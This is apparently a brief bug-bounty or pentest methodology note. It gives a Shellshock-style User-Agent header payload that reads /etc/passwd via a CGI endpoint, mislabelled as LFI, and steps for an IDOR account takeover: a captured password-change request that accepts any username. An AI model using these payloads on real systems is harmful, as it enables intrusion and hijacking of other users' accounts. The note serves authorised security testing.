# Methodolgy: LFI



#### 1. Directory Transversal look for <kbd>GET /cgi-bin/status</kbd> and set the User-Agent to

```
User-Agent: {:;}; echo $(</etc/passwd)
```


# Methodolgy: IDOR

IDOR in the password change functionality

#### 1. Try to change password and check the raw request with Burp Suite

```
POST /api/change_password HTTP/1.1
HOST: redacted.com
Cookie: ci_session= kefrsfdsdfmsdfldgh?h
Accept: application/json

{
    "account":"{username}",
    "password":"{password}"
}
```
#### 2. Input any valid user account and input any password


